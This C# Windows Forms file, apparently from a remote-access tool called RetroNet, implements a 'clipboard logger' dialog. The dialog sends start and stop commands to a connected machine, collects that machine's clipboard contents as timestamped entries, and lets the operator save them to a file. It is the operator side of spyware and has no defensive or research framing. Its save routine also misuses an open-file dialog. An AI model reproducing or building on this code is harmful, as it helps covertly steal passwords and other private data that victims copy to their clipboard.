using RetroNet.Classes;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RetroNet.Forms
{
    public partial class ClipboardLoggerDialog : Form
    {
        Connection _client;

        public ClipboardLoggerDialog(Connection client)
        {
            InitializeComponent();

            _client = client;
        }

        private void ClipboardLoggerDialog_Load(object sender, EventArgs e)
        {
            _client.send(new Packet(Command.ClipboardStart).toArray());
        }

        private void ClipboardLoggerDialog_FormClosing(object sender, FormClosingEventArgs e)
        {
            _client.send(new Packet(Command.ClipboardStop).toArray());
        }

        private void saveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog() { Filter = "Text File|*.txt" })
            {
                if (ofd.ShowDialog() == DialogResult.OK)
                    File.WriteAllText(ofd.FileName, clipboardTextBox.Text);
            }
        }

        private void clearToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (clipboardTextBox)
                clipboardTextBox.Clear();
        }

        public void updateClipboard(Packet p)
        {
            lock (clipboardTextBox)
                clipboardTextBox.Text += "[--------------------" + DateTime.Now.ToString() + "--------------------]" + Environment.NewLine + Encoding.Unicode.GetString(p.Data[0]) + Environment.NewLine + Environment.NewLine;
        }
    }
}
